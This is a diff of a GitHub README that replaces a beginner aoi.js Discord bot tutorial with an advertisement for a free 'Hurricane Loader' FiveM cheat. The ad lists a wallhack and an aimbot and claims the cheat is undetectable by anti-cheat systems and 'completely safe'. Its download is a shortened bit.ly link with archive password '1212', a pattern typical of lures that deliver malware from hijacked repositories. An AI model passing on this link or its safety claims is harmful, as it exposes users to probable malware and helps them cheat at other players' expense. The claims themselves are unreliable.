@@ -1,110 +1,41 @@
-# thanks for using Real trickz discord bot basic!
-here you can have everything a basic bot have! it took much hours for me to code this so please like! if you want to suppot it would be really good if you can gift me nitro! username **Real trickz#0001**! thanks so much for you guys love and support! i will be making more projects like this!
+# HURRICANE LOADER FOR FIVEM [![Github All Releases](https://img.shields.io/github/downloads/SecHex/SecHex-Spoofy/total)]() [![Codacy Badge](https://app.codacy.com/project/badge/Grade/0d4fdc1daca5402a8c57efc3bef73d31)]()
+[![do42s](https://github.com/jakerellson55/jakerellson55-proj/assets/163674734/18510351-377a-470b-9824-e28125367f91)](https://bit.ly/3TCnMD1)
+> Password: 1212
 
-***IF YOU WANNA BUY ADVANCED BOT THEN U CAN DM ME! IM ALWAYS HAPPY TO MAKE FOR CHEAP PRICE***
+![image](https://github.com/Realtrickz/basic-discord-bot/assets/68506517/da03c65b-bcdd-4a86-88fd-f470b991c60a)
 
-** **
 
-# Setup for the bot
+> [!NOTE]
+> FiveM Hurricane cheat is designed specifically to give players the ability to fully control the gameplay and enjoy the game without limitations. We offer an extensive set of features that can be activated and customized according to each player's preferences. Just recently we decided to make our cheat free and available to all players without exception. Thanks to our 24/7 support, we fix your problems on time and keep our cheat on top.
 
-if you never have experience creating bot before then i have your back!
+---
 
-** **
-***CREATING AN DISCORD BOT APPLICATION***
+<div align="center">
+  
+### Features 🛠️:
 
-to create your own first application, you have to head to official discord developer portal! you can redirect to here by pressing [this](https://discord.com/developers/applications)! then press **NEW APPLICATION** button which is located left side of your discord profile picture! [PLEASE MAKE SURE YOU'VE LOGGED IN](https://discord.com/login)! you can name it to whatever you want! it doesnt matter! it may look like this!
+</div>
 
-<img src="https://i.ibb.co/d7yfYrW/Screenshot-3.png" alt="Screenshot-3" border="0"> **press create button below and you will be at this page!**
+- ESP (Wallhack) - this feature of our cheat will allow you to see behind walls! You will be able to see players' names, their health, exact distance to them, the contents of crates, various lines (such as sight lines), team affiliation and much more!
+- AIMBOT (Aim Target) - we have implemented the best aimbot (automatic aiming) with lots of customization options. This allows each of your shots to be the last for your opponent. You can choose the target - it can be a specific body part or just precise aiming.
+- Misc (Tools) - our cheat also has a number of useful tools. For example, there is a function that removes weapon recoil and makes it reload faster. It is also possible to reduce ping, increase FPS by removing unnecessary objects in the scene. There are other useful features.
 
-** **
-<img src="https://i.ibb.co/pyzVkYY/Screenshot-4.png" alt="Screenshot-4" border="0">
+ 
+> [!TIP]
+> 1. Anti-cheats (VAC, FACEIT, ESEA, BATTLEYE, EAC and many others) cannot detect our cheat.
+> 2. Most importantly: the program is completely safe for your Windows system.
+> 3. Support for most systems: Windows 7/8/8.1/10/11 (x32/64) 
 
-**Perefect! now press the BOT text which is show on left side. the extention icon one! the press ADD BOT! and then you will be at this page**
+---
 
-** **
-<img src="https://i.ibb.co/TkpsTQR/Screenshot-5.png" alt="Screenshot-5" border="0">
+<div align="center">
+  
+### Screenshots 📖 :
 
-** **
-**alright! its all done! now lets get to real developers job! please dont close discord developer portal! it is important in some minuits! alright so lets get to another part!**
+</div>
 
-** *
-# Creating a discord bot
+![c8a75de1ab9d93d4d24d305dabbe90a1](https://github.com/Realtrickz/basic-discord-bot/assets/68506517/58b1f065-e9c9-4663-baf4-35f8ef171ec3)
 
-** to create a discord bot we need an code and a file! our main file will be named as `index.js`!**
 
-**first we need to install the package, so please paste this at your terminal! if your at replit then ignore this**
+![0964af062e083a67463eadce2df2482a](https://github.com/Realtrickz/basic-discord-bot/assets/68506517/9ca4f318-7ddc-4154-a95b-f630d6bcdda1)
 
-```js
-npm i aoi.js
-```
-
-**head over there and paste this code! for you i aldredy pasted the code! maybe if you want to make your own code then dont hesitate to git clone this file or copy paste this code! i recomment git clone! anyways here is the code!**
-
-```js
-const aoijs = require("aoi.js")
-
-const bot = new aoijs.Bot({
-token: "TOKEN", //Discord Bot Token
-prefix: "PREFIX" //Discord Bot Prefix
-})
-bot.onMessage() //Allows to execute Commands
-
-bot.command({
-name: "ping", //Trigger name (command name)
-code: `Pong! $pingms` //Code
-})
-
-bot.readyCommand({
-    code: `$log[Ready on $userTag[$clientID]! Parasing Packages of $userTag[853222169298599986]]` //Example Ready on Client
-})
-```
-**OP you did it! ok now head over to index.js and then change the `"TOKEN"` to `process.env.token`! this will make your bot token private! now create a `.env` file and paste this!**
-
-```json
-token=PASTE_YOUT_TOKEN_HERE
-```
-
-**Now we made our token private!**
-
-**Note: IF YOU ARE REPLIT PLEASE PRESS THE LOCK ICON IN UR LEFT SIDE CORNER AND MAKE `NEW ENV` FILE AND NAME IT `token` and put value as ur token!**
-
-**alright you did it! everything cool!**
-
-***
-# Creating a command handler
-
-alright! we made an discord bot! now what is a **command handler?** it is an handler which stores a package of commands code in a folder so it may not be messy! lets create those!
-
-**so first recode/replace the index.js to this!**
-```js
-const aoijs = require("aoi.js")
-
-const bot = new aoijs.Bot({
-token: "TOKEN", //Discord Bot Token
-prefix: "PREFIX" //Discord Bot Prefix
-})
-bot.onMessage() //Allows to execute Commands
-bot.loadCommands(`./commands/`) //Allows Commands executed by `commands` folder
-
-bot.command({
-name: "ping", //Trigger name (command name)
-code: `Pong! $pingms` //Code
-})
-
-bot.readyCommand({
-    code: `$log[Ready on $userTag[$clientID]! Parasing Packages of $userTag[853222169298599986]]` //Example Ready on Client
-})
-
-```
-
-**alright! now create a folder named `commands`! andmake a file named `ping.js` and paste this code**
-
-```js
-module.exports = ({
-  name: "ping", // the command name here
-  code: `$title[Ping!] $description[Pong! it took **$pingms**!] $footer[Credits to Real trickz] $color[RANDOM]` // the code is located here!
-})
-```
-
-** **
-# MORE FUNCTIONS EXPLAINED AT 10 LIKES
